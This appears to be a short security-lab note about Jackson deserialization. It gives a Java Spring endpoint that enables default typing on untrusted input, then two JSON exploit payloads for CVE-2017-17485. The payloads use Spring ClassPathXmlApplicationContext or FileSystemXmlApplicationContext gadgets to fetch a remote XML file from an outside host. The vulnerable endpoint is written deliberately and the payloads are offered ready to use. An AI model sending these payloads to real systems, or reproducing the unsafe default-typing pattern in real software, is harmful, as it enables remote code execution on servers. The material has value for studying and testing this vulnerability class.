### 后端代码
```java
    @RequestMapping(value = "/deserialize/vuln", method = {RequestMethod.POST})
    @ResponseBody
    public static String deserialize_vuln(@RequestBody String params) throws IOException {
        System.out.println(params);
        try {
            ObjectMapper objectMapper = new ObjectMapper();
            objectMapper.enableDefaultTyping();
            Object obj = objectMapper.readValue(params, Object.class);
            String result = objectMapper.writeValueAsString(obj);
            return result;
        }  catch (Exception e){
            e.printStackTrace();
            return e.toString();
        }
    }
```

### CVE-2017-17485


```json
["org.springframework.context.support.ClassPathXmlApplicationContext", "http://cqq.com:8888/spel3.xml"]
```
或者
```json
["org.springframework.context.support.FileSystemXmlApplicationContext", "http://cqq.com:8888/spel3.xml"]
```
